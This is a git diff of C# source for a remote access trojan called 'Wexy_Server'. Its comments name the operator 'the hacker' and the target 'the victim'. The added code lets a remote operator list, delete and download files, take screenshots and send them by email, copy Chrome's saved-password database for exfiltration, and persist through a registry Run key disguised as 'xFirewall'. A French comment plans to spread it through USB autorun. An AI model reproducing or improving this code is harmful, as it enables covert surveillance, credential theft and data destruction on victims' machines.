@@ -10,42 +10,31 @@ using System.Net;
 using System.IO;
 using System.Data;
 using System.Security.Cryptography;
+using Mono.Nat;
 
 
 namespace Wexy_Server
 {
-    class Server
+    public class Server
     {
         public static NetworkStream Receiver;
         public static NetworkStream Writer;
-
-        //[DllImport("user32.dll")]
-        //public static extern bool FreeConsole(); //hides the console from view.
-
-        //TODO - > the server must be able to connect to the internet without being blocked by the firewall
-        public static void BypassFirewall()
-        {
-
-        }
-
-        //TODO - > Disconnect the client
-        public static void DisconnectClient()
-        {
-                
-        }
-        
-       
-        
+        public static TcpListener listenner ;
+        public static System.Threading.Thread Rec;
+        public static TcpClient client;
+   
         public static void ReceiveCommands()
         {
+            
             //Infinite loop 
             while (true)
             {
                 //try to read the data from the client(the hacker)
+               
                 try
                 {
                     //Packet of the received data
-                    byte[] RecPacket = new byte[1000];
+                    byte[] RecPacket = new byte[10000];
 
                     //Read a command from the client.
                     Receiver.Read(RecPacket, 0, RecPacket.Length);
@@ -65,50 +54,95 @@ namespace Wexy_Server
                     switch (command)
                     {
                         case "msg":
-                            //Display the message in a messagebox (the trim removes any excess data received)
+                            //Display a message
                             string Msg = CommandArray[1];
                             DisplayMessage(Msg);
                             break;
 
                         case "open":
-                            //Open the website with internet explorer
+                            //Open a website with Internet Explorer
                             string site = CommandArray[1];
                             OpenWebsite(site);
                             break;
 
                         case "ss":
-                            //Draw the screen and transform it into an actual image
-                            TakeScreenshot();
+                            //Take a screenshot of the screen and send it via mail
+                            string from = CommandArray[1];
+                            string password = CommandArray[2];
+                            string to = CommandArray[3];
+                            TakeScreenshot(from, password,to);
                             break;
 
                         case "pcname":
-                            //Get the pc name
+                            //Get the computer name
                             SendPCName();
                             break;
 
                         case "showfiles":
+                            //Show files in a folder
                             string dir = CommandArray[1];
-                            if (dir == "C")
-                            {
-                                dir = @"C:/";
-                                ListFiles(dir);
-                                break;
-                            }
-                                
-                            else
-                            {
-                                dir = @"C:/users/" + Environment.UserName + "/Desktop/";
-                                ListFiles(dir);
-                                break;
-                            }
+                            ListFiles(dir);
+                            break;
+
+                        case "showfolders":
+                            //Show sub-directories in a folder
+                            string path = CommandArray[1];
+                            ListFolders(path);
+                            break;
+
+                        case "del":
+                            //Delete a file
+                            string location = CommandArray[1];
+                            deleteFile(location);
+                            break;
+
+                        case "getFile":
+                            //Send a file to mail
+                            string filePath = CommandArray[1];
+                             string sender = CommandArray[2];
+                            string sender_pass = CommandArray[3];
+                            string to_mail = CommandArray[4];
+                            getFile(filePath, sender,sender_pass, to_mail);
+                            break;
 
                         case "openApp":
-                            //Open specified application
+                            //Open an application
                             string appName = CommandArray[1];
                             openApp(appName);
                             break;
 
-                        case "disconnect":
+                        case "show":
+                            //Sending pending data
+                            SendPendingData();
+                            break;
+                        case "getos":
+                            //Get the OS Version
+                            getOSVersion();
+                            break;
+
+                        case "ischruser":
+                            //Tell if the user has a google chrome user profile
+                            isChromeUser();
+                            break;
+
+                        case "copylogindata":
+                            //Copy the file Login Data to Login Data.FILE to make it sendable via mail
+                            copyLoginData();
+                            break;
+
+                        case "download":
+                            //download a file from the remote computer
+                            string filepath = CommandArray[1];
+                            sendFile(filepath);
+                            break;
+
+                        case "screenshot":
+                            SendScreenshot();
+                            break;
+
+                        case "quit":
+                            //Drop connection
+                            DropConnection();
                             break;
                     }
                 }
@@ -119,76 +153,53 @@ namespace Wexy_Server
             }
         }
 
-
         #region Commands
 
-       
-        //- ALMOST OK - [NOT TESTED YET]> returns the computer's IP adress.
-        public static string getIp()
+        // - ALMOST OK - [Files are not completely downloaded, also it changes the stream bytes]
+        public static void SendScreenshot()
         {
-            string uneReponse = "";
-            //Create a request for the URL
-            try
-            {
-                WebRequest request = WebRequest.Create("http://myexternalip.com/raw");
-                //Get the response
-                WebResponse response = request.GetResponse();
-                //Get the stream containning the data sent by the server
-                Stream dataStream = response.GetResponseStream();
-                //Open the stream with streamreader for easy access.
-                StreamReader reader = new StreamReader(dataStream);
-                //Read the content.
-                string responseFromServer = reader.ReadToEnd();
-                reader.Close();
-                response.Close();
-                uneReponse = responseFromServer;
-            }
-            catch
-            { }
-            return uneReponse;
+            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+            Graphics graphics = Graphics.FromImage(bitmap as Image);
+            graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
+            bitmap.Save(@"C:/users/"+Environment.UserName+"/desktop/screen.jpg", ImageFormat.Jpeg);
+
+            string screenpath = "C:/users/" + Environment.UserName + "/desktop/screen.jpg";
+            FileInfo fileInfo = new FileInfo(screenpath);
+            Stream s = client.GetStream();
+            byte[] filebytes = File.ReadAllBytes(screenpath);
+            s.Write(filebytes, 0, filebytes.Length);
+            File.Delete(screenpath);
         }
 
-
-        //- ALMOST OK - [NOT TESTED YET] the server hides itself inside the registry and is launched on Windows startup.
-        public static void AddToStartup()
+        // - ALMOST OK - [Files are not completely downloaded]
+        public static void sendFile(string filePath)
         {
-            using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser
-                 .OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+            FileInfo fileInfo = new FileInfo(filePath);
+            Stream s = client.GetStream();
+            byte[] filebytes = File.ReadAllBytes(filePath);
+            s.Write(filebytes, 0, filebytes.Length);
+        }
+        
+        // - ALMOST OK - 
+        public static void isChromeUser()
+        {
+            
+            while (Directory.Exists("C:/Users/" + Environment.UserName + "/AppData/Local/Google/Chrome/User Data/Default"))
             {
-                //We set the key name to Windows Updater ,so if the victim browses throught the registry , he won't notice anything malicious.
-                key.SetValue("Windows Updater", "\"" + Application.ExecutablePath + "\"");
+                string response = "not user";
+                byte[] Packet = Encoding.ASCII.GetBytes(response);
+                Writer.Write(Packet, 0, Packet.Length);
+                Writer.Flush();
+                break;
             }
         }
-
-        //- ALMOST OK - [NOT TESTED YET] the server tells the client he is alive and sends him the victim's IP. 
-        //To be called on main.
-        public static void NotifyClient()
+        // - ALMOST OK - 
+        public static void getOSVersion()
         {
-            try
-            {
-                //Configure the stmp client
-                SmtpClient client = new SmtpClient("smtp.live.com");
-                client.Port = 587;
-                client.EnableSsl = true;
-                client.Timeout = 100000;
-                client.DeliveryMethod = SmtpDeliveryMethod.Network;
-                client.Credentials = new System.Net.NetworkCredential("your_mail_sender", "your_password");
-
-                //Configure the mail to send
-                //Attachment objAttachment = new Attachment(@"path_to_file_you_wanna");
-                MailMessage msg = new MailMessage();
-                msg.To.Add("your_mail_receiver");
-                msg.From = new MailAddress("your_mail_sender");
-                //msg.Attachments.Add(objAttachment);
-                msg.Subject = "Wexy server has started ! ";
-                msg.Body = "Wexy server is alive at -> " + getIp();
-
-                client.Send(msg);
-            }
-            catch //Could not send the mail(may be disconnected from the internet), so we close the application , it will start again on startup.
-            {
-                Environment.Exit(0);
-            }
+            string osversion = Environment.OSVersion.ToString();
+            byte[] Packet = Encoding.ASCII.GetBytes(osversion);
+            Writer.Write(Packet, 0, Packet.Length);
+            Writer.Flush();
         }
 
         // - ALMOST OK - 
@@ -200,20 +211,78 @@ namespace Wexy_Server
             app.Start();
         }
 
-        // - NOT OK - [Ramdom blank lines appear..]
+        // - ALMOST OK - crashes when trying to access protected folders like c:/users/welsen/cookies
+        public static void ListFolders(string location)
+        {
+            string[] xfolders = Directory.GetDirectories(location);
+            if (xfolders.Length == 0)
+            {
+                string response = "no folders here...";
+                byte[] Packet = Encoding.ASCII.GetBytes(response);
+                Writer.Write(Packet, 0, Packet.Length);
+                Writer.Flush();
+            }
+            else
+            {
+                string[] directories = xfolders;
+
+                string folders = "";
+                foreach (string item in directories)
+                {
+                    folders = folders + item + "\n";
+                }
+
+                /*tryout **  send an array throught bytes
+                string[] xfolders = null;
+                for (int i = 0; i < directories.Length; i++)
+                {
+                    xfolders[i] = directories[i];
+                }*/
+                byte[] Packet = Encoding.ASCII.GetBytes(folders);
+                Writer.Write(Packet, 0, Packet.Length);
+                Writer.Flush();
+            }
+            
+        }
+
+        // - ALMOST OK - It doesn't display the first file and the last ones , only a few files..
         public static void ListFiles(string location)
         {
-            string allFiles = "";
+            string files = "----------------";
             System.IO.DirectoryInfo dir = new System.IO.DirectoryInfo(location);
-            
+           
             foreach (System.IO.FileInfo f in dir.GetFiles("*.*"))
             {
-                allFiles = allFiles +"\n"+f.Name;
+                files = files + "\n" + f.Name + " - " + f.Length.ToString()+" bytes" +"\n----------------";
             }
 
-            byte[] Packet = Encoding.ASCII.GetBytes(allFiles);
+            byte[] Packet = Encoding.ASCII.GetBytes(files);
             Writer.Write(Packet, 0, Packet.Length);
             Writer.Flush();
+        }
+
+        // - ALMOST OK - 
+        public static void SendPendingData()
+        {
+            try
+            {
+                string nothing = "";
+
+                //Creates a packet to hold the command, and gets the bytes from the string variable
+                byte[] Packet = Encoding.ASCII.GetBytes(nothing);
+
+                //Send the command over the network
+                Writer.Write(Packet, 0, Packet.Length);
+
+                //Flush out any extra data that didnt send in the start.
+                Writer.Flush();
+            }
+            catch
+            {
+                Console.WriteLine("client disconnected from server!");
+                Console.ReadKey();
+                Writer.Close();
+            }
         }
 
         // - ALMOST OK - [Multiple blank lines generated after the Computer name is received.]
@@ -240,19 +309,8 @@ namespace Wexy_Server
             }
         }
 
-        // - OK - 
-        public static void TakeScreenshot()
-        {
-            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-            Graphics graphics = Graphics.FromImage(bitmap as Image);
-            graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
-            bitmap.Save(@"C:\\Users\\" + Environment.UserName + "\\desktop\\screenshot.jpeg", ImageFormat.Jpeg);
-            sendScreenshot();
-            System.IO.File.Delete(@"C:\\Users\\" + Environment.UserName + "\\desktop\\screenshot.jpeg");
-        }
-
-        // - OK - 
-        public static void sendScreenshot()
+        // - ALMOST OK - [Crashes a few seconds after sending the file]
+        public static void getFile(string location,string from, string password, string to)
         {
             try
             {
@@ -262,16 +320,16 @@ namespace Wexy_Server
                 client.EnableSsl = true;
                 client.Timeout = 100000;
                 client.DeliveryMethod = SmtpDeliveryMethod.Network;
-                client.Credentials = new System.Net.NetworkCredential("your_mail_sender", "your_password");
+                client.Credentials = new System.Net.NetworkCredential(from, password);
 
                 //Configure the mail to send
-                Attachment objAttachment = new Attachment(@"C:\\Users\\" + Environment.UserName + "\\desktop\\screenshot.jpeg");
+                Attachment objAttachment = new Attachment(location);
                 MailMessage msg = new MailMessage();
-                msg.To.Add("your_mail_receiver");
-                msg.From = new MailAddress("your_mail_sender");
+                msg.To.Add(to);
+                msg.From = new MailAddress(from);
                 msg.Attachments.Add(objAttachment);
-                msg.Subject = "New screenshot";
-                msg.Body = "Target screen was captured :D";
+                msg.Subject = "New file !";
+                msg.Body = "A new file was downloaded from the remote computer";
 
                 client.Send(msg);
             }
@@ -279,6 +337,65 @@ namespace Wexy_Server
             {
                 Environment.Exit(0);
             }
+        }
+
+        // - ALMOST OK - [Crashes a few seconds after sending the file]
+        public static void sendScreenshot(string from, string password, string to)
+        {
+            try
+            {
+                //Configure the stmp client
+                SmtpClient client = new SmtpClient("smtp.live.com");
+                client.Port = 587;
+                client.EnableSsl = true;
+                client.Timeout = 100000;
+                client.DeliveryMethod = SmtpDeliveryMethod.Network;
+                client.Credentials = new System.Net.NetworkCredential(from,password);
+
+                //Configure the mail to send
+                Attachment objAttachment = new Attachment(@"C:\\Users\\" + Environment.UserName + "\\desktop\\screenshot.jpeg");
+                MailMessage msg = new MailMessage();
+                msg.To.Add(to);
+                msg.From = new MailAddress(from);
+                msg.Attachments.Add(objAttachment);
+                msg.Subject = "New screenshot";
+                msg.Body = "The remote computer's screen was captured ! ";
+
+                client.Send(msg);
+            }
+            catch //Could not send the mail(may be disconnected from the internet), so we close the application , it will start again on startup.
+            {
+                //Environment.Exit(0);
+            }
+        }
+
+        // - ALMOST OK - [Can't reconnect the socket] 
+        public static void DropConnection()
+        {
+            client.Client.Shutdown(SocketShutdown.Both);
+            client.Client.Close();
+            client.Close();
+        }
+
+        // - OK -
+        public static void copyLoginData()
+        {
+            try
+            {
+                File.Copy("C:/Users/" + Environment.UserName + "/AppData/Local/Google/Chrome/User Data/Default/Login Data", "C:/Users/" + Environment.UserName + "/AppData/Local/Google/Chrome/User Data/Default/Login Data.FILE");
+            }
+            catch
+            { }
+        }
+        // - OK - 
+        public static void TakeScreenshot(string from, string password, string to)
+        {
+            Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
+            Graphics graphics = Graphics.FromImage(bitmap as Image);
+            graphics.CopyFromScreen(0, 0, 0, 0, bitmap.Size);
+            bitmap.Save(@"C:\\Users\\" + Environment.UserName + "\\desktop\\screenshot.jpeg", ImageFormat.Jpeg);
+            sendScreenshot(from, password, to);
+            //System.IO.File.Delete(@"C:\\Users\\" + Environment.UserName + "\\desktop\\screenshot.jpeg");
         }
 
         // - OK - 
@@ -297,33 +414,55 @@ namespace Wexy_Server
             System.Windows.Forms.MessageBox.Show(message.Trim('\0'));
         }
 
+        // - OK - 
+        public static void deleteFile(string location)
+        {
+            File.Delete(location);
+        }
+
+        // - OK - 
+        public static void addToStartup()
+        {
+            using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser
+                .OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+            {
+                key.SetValue("xFirewall", "\"" + Application.ExecutablePath + "\"");
+            }
+        }
+
+        // - OK - 
+        public static void RemoveFromStartup()
+        {
+            using (Microsoft.Win32.RegistryKey key = Microsoft.Win32.Registry.CurrentUser
+                .OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
+            {
+                key.DeleteValue("xFirewall", false);
+            }
+        }
+
         #endregion
-
-
-
-
 
         static void Main(string[] args)
         {
-            //FreeConsole();
+            //Deploiement idée :
+            //Clé usb avec un autorun , lorsqu'elle est branchée sur un pc , la clé va copier l'executable sur le système et executer l'application
+            //Egalement , faudrait qu'elle me donne l'adresse IP de la machine dans la clé usb.
 
-            TcpListener l = new TcpListener(System.Net.IPAddress.Any, 2000);
-            l.Start();
+            //addToStarup();
+            listenner = new TcpListener(IPAddress.Any, 2000);
+            //listenner = new TcpListener(IpAdress.Parse("external_ip", 2000);
+            listenner.Start();
 
-            //Wait for client to connect, then make a TcpClient to accept the connection
-            TcpClient connection = l.AcceptTcpClient();
-            
+            for (int i = 0; i < 10; i++)
+            {
+                client = listenner.AcceptTcpClient();
+                Receiver = client.GetStream();
 
-            //Get Connection's stream
-            Receiver = connection.GetStream();
+                Writer = client.GetStream();
 
-            //Allows us to write send data to the client
-            Writer = connection.GetStream();
-
-            //Start the receive commands thread
-            //We will run the ReceiveCommands() method on another thread, so the CPU doesnt go haywire
-            System.Threading.Thread Rec = new System.Threading.Thread(new System.Threading.ThreadStart(ReceiveCommands));
-            Rec.Start();
+                Rec = new System.Threading.Thread(new System.Threading.ThreadStart(ReceiveCommands));
+                Rec.Start();
+            }        
         }
     }
 }
